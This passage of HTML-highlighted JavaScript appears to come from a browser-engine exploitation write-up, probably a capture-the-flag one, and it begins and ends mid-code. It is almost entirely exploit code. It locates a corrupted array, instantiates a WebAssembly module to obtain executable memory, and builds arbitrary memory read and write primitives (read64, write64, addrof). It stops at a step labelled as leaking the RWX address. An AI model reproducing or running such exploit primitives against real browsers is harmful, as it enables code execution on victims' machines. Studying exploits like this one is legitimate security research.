class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;yee2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;

function main() &lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f2i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;yoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f2i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;yoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;yoff&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;yoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;WASM start&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wasm_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x84&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wasm_mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WebAssembly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wasm_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wasm_instance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WebAssembly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wasm_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wasm_instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// found a&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f2i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;yee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// leak rwx address&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wasm_instance_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wasm_instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
